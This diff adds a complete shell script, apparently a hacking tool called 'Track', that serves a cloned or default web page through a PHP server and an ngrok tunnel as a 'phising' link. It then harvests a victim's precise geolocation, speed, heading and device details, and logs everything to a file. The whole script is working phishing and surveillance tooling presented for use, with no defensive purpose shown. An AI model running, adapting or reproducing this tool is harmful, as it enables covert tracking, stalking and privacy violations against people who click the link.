@@ -1,0 +1,172 @@
+#!/usr/bin/env sh
+
+bi='\033[34;1m' #biru
+ij='\033[32;1m' #ijo
+pr='\033[35;1m' #purple
+cy='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #putih
+ku='\033[33;1m' #kuning
+or='\033[1;38;5;208m' #Orange
+#batas
+
+banner(){
+    echo $bi """
+\t\t           .          +        /--------------------
+\t\t  +                     _ _ _ | Hack The Planets    |
+\t\t              +        /   .   | Track Me On DarkNet|
+\t\t  .      OOOOOOOOOOOO/OOO      \--------------------/
+\t\t     OO..***......./**.....OO         .   +
+\t\t    OO.....*******/***........OO
+\t\t  OO......**********...........OO        +      .    .
+\t\t OO.........****...*............OO
+\t\t  O............**.................O      +    .
+\t\t O...........*******.............O                +
+\t\t  O..........*********............O
+\t\t OO.........********............OO        .     .
+\t\t  OO.........*****.............OO    +               +
+\t\t   OO........***.............OO               +
+\t\t +   OO.......**...........OO      .
+\t\t   .     OOOOOOOOOOOOOOOO                             +
+
+
+
+    """
+sleep 0.99
+echo "$bi [$ku + $bi]══════[ $me Author : @HedyFake $ku _-\|/-_ $me Twiter:@iAmHere96509064 $bi ]══════[$ku + $bi]"
+echo "\t\t╔──────────────────────────────────────────────╗"
+echo "\t\t|              $pu Track   Version 0.01 $ij          |"
+echo "\t\t|              $pu What just happened? $ij           |"
+echo "\t\t┖──────────────────────────────────────────────┙"
+sleep 0.05
+echo
+}
+
+ngrok(){
+  echo "$bi[$pu+$bi] Start php server...!!"
+  php -t "server/" -S 0.0.0.0:3333 > /dev/null 2>&1 &
+  sleep 1
+  echo "$bi[$pu+$bi] Start ngrok server...!!"
+  ngrok http 3333 > /dev/null 2>&1 &
+  sleep 3
+  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
+  echo 
+  echo "$cy[$pu+$cy] Link phising:$pu" $link
+  sleep 3
+}
+
+uoutput(){
+    lat=$(cat server/geolocate.txt | grep 'Latitude' | awk '{print $2}')
+    long=$(cat server/geolocate.txt | grep 'Longitude' | awk '{print $2}')
+    user=$(cat server/geolocate.txt | grep 'User-Agent')
+    alti=$(cat server/geolocate.txt | grep 'Altitude' | awk '{print $2}')
+    acc=$(cat server/geolocate.txt | grep 'Accuracy' | awk '{print $2}')
+    speed=$(cat server/geolocate.txt | grep 'Speed' | awk '{print $2}')
+    head=$(cat server/geolocate.txt | grep 'Heading' | awk '{print $2}')
+    plat=$(cat server/geolocate.txt | grep 'Platform' | awk '{print $2}')
+    core=$(cat server/geolocate.txt | grep 'Cores' | awk '{print $2}')
+    memo=$(cat server/geolocate.txt | grep 'Memory' | awk '{print $2}')
+    heigth=$(cat server/geolocate.txt | grep 'Screen Height' | awk '{print $3}')
+    width=$(cat server/geolocate.txt | grep 'Screen Width' | awk '{print $3}')
+    batt=$(cat server/geolocate.txt | grep 'Battery' |awk '{print $2}')
+    echo "\n"
+    echo "$or[$pu!$or]$pu Gelocation"
+    echo 
+    echo "$bi[$pu+$bi]$pu Latitude  :" $lat
+    echo "$bi[$pu+$bi]$pu Longitude :" $long
+    echo "$bi[$pu+$bi]$pu Altitude  :" $alti
+    echo "$bi[$pu+$bi]$pu Heading   :" $head
+    echo "$bi[$pu+$bi]$pu Speed     :" $speed
+    echo "$bi[$pu+$bi]$pu Accuracy  :" $acc
+    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Map       :\e[0m\e[1;77m https://www.google.com/maps/place/%s+%s\n\e[0m" $lat $long
+    echo
+    echo "$me[$pu!$me]$pu Device Info"
+    echo "$bi[$pu+$bi]$pu Memory    :" $memo
+    echo "$bi[$pu+$bi]$pu Cores     :" $core
+    echo "$bi[$pu+$bi]$pu Platform  :" $plat
+    echo "$bi[$pu+$bi]$pu Resolution:" $heigth $width
+    echo "$bi[$pu+$bi]$pu Battery   : $batt%"
+
+    echo "$me[$ij+$me]$pu Saved     : locad.txt"
+    cat server/geolocate.txt >> locad.txt
+    rm -rf server/geolocate.txt
+
+
+    
+}   
+
+waiting(){
+    rm -rf server/error.txt
+    echo "$bi[$pu+$bi]$pu Waiting Target......."
+    while [ true ]; do
+    
+    if [ -e "server/geolocate.txt" ]; then
+    echo "$ij[$pu+$ij]$pu Geolocation Found......."
+    echo 
+    echo "$me[$or!$me]$ku Ketik CTRL + C untuk stop.!!"
+    uoutput
+    fi
+
+
+    if [ -e "server/error.txt" ]; then 
+    echo "$me[$or!$me]$pu Eror"
+    waiting
+    fi
+    sleep 0.40
+    done
+
+
+
+}
+
+module(){
+    rm -rf server/index.php
+   rm -rf server/geolocate.txt
+   cat server/load.html >> server/index.php
+}
+module2(){
+    rm -rf server/track.html
+    rm -rf server/redi.html
+    clone=$(zenity --title "☢ CLONE WEBSITE ☢" --text "PASTE LINK WEBSITE TO CLONE" --entry --entry-text "www.google.com" --width 400 2> /dev/null)
+    wget $clone --no-check-certificate -O server/track.html -c -k -U "Mozilla/5.0 (Linux; Android 9; TA-1032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36" > /dev/null 2>&1
+    rm -rf server/index.php 
+    rm -rf server/geolocate.txt
+    echo '<html><script>setTimeout(function(){window.location.href="load.html";}, 15000);</script><html>' >> server/redi.html
+
+    cat server/track.html >> server/index.php 
+    cat server/redi.html >> server/index.php 
+}
+pill(){
+    echo "$ij[$pu+$ij]>>>$pu Menu$ij <<<[$pu+$ij]"
+    echo 
+    echo "$bi[$pu 1 $bi]$pu Clone Website"
+    echo 
+    echo "$bi[$pu 2 $bi]$pu Default"
+    echo
+    echo "$bi[$pu 3 $bi]$pu Exit Progams"
+    sleep 1
+    read -p "root@track->#" pillck
+
+    if [ $pillck -eq "2" ]; then
+    module
+    ngrok
+    waiting
+    fi
+
+    if [ $pillck -eq "1" ]; then
+    module2
+    ngrok
+    waiting
+    else
+    echo "$me[$or!$me]$pu Command Not Found"
+    fi
+
+
+
+}
+
+
+
+banner
+pill
+
